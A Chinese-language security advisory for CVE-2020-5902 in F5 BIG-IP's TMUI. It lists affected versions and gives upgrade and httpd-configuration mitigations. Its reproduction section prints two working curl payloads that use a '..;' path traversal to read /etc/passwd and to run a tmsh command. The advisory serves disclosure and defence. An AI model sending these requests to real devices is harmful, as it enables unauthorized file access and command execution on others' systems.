一、F5 BIG-IP介绍
F5 BIG-IP Edge Gateway是一个接入解决方案，为远程用户提供了SSL VPN远程接入、安全性、应用加速和高可用性服务。
二、漏洞描述
漏洞编号：CVE-2020-5902
发布时间：2020年07月03日
危害等级：严重
漏洞详情：未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意Java代码执行。进而控制F5 BIG-IP的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等，该漏洞影响控制面板受影响，不影响数据面板。
三、影响版本
BIG-IP 15.x: 15.1.0/15.0.0BIG-IP 14.x: 14.1.0 ~ 14.1.2BIG-IP 13.x: 13.1.0 ~ 13.1.3BIG-IP 12.x: 12.1.0 ~ 12.1.5BIG-IP 11.x: 11.6.1 ~ 11.6.5
四、漏洞检测与复现
4.1 漏洞检测

此漏洞EXP披露后，Tide安全团队第一时间更新了关于“F5 BIG-IP TMUI 远程代码执行漏洞（CVE-2020-5902）”的POC。用户可通过潮声漏洞检测平台 http://poc.tidesec.com/ 进行漏洞检测。

4.2 漏洞复现

1、任意文件读取poc
curl -v -k 'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
2、命令执行poc
curl -v -k 'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'
五、整改方案
5.1 升级
升级到以下版本
BIG-IP 15.x: 15.1.0.4BIG-IP 14.x: 14.1.2.6BIG-IP 13.x: 13.1.3.4BIG-IP 12.x: 12.1.5.2BIG-IP 11.x: 11.6.5.2
5.2 加固建议
官方建议可以通过以下步骤临时缓解影响：
1、使用以下命令登录对应系统
tmsh
2、编辑 httpd 组件的配置文件       
edit /sys httpd all-properties
3、文件内容如下
include ' <LocationMatch ".*..;.*"> Redirect 404 / </LocationMatch> '
4、按照如下操作保存文件
按下 ESC 并依次输入 :wq
5、执行命令刷新配置文件
save /sys config
6、重启 httpd 服务
restart sys service httpd   并禁止外部IP对 TMUI 页面的访问
